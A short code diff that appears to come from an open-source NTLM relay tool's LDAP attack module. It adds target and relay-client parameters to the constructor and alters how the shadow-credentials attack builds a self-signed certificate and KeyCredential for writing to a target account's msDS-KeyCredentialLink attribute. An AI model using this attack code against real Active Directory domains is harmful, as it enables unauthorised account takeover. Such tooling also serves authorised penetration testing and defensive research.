@@ -116,10 +116,10 @@ class LDAPAttack(ProtocolAttack):
     GENERIC_EXECUTE         = 0x00020004
     GENERIC_ALL             = 0x000F01FF
 
-    def __init__(self, config, LDAPClient, username):
+    def __init__(self, config, LDAPClient, username, target=None, relay_client=None):
         self.computerName = '' if not config.addcomputer else config.addcomputer[0]
         self.computerPassword = '' if not config.addcomputer or len(config.addcomputer) < 2 else config.addcomputer[1]
-        ProtocolAttack.__init__(self, config, LDAPClient, username)
+        ProtocolAttack.__init__(self, config, LDAPClient, username, target, relay_client)
         if self.config.interactive:
             # Launch locally listening interactive shell.
             self.tcp_shell = TcpShell()
@@ -284,10 +284,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, nBefore=(-40 * 365), nAfter=(40 * 365))
+        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget)
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
-        keyCredential = shadow_credentials.KeyCredential(certificate,key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
+        keyCredential = shadow_credentials.KeyCredential(key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
         #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
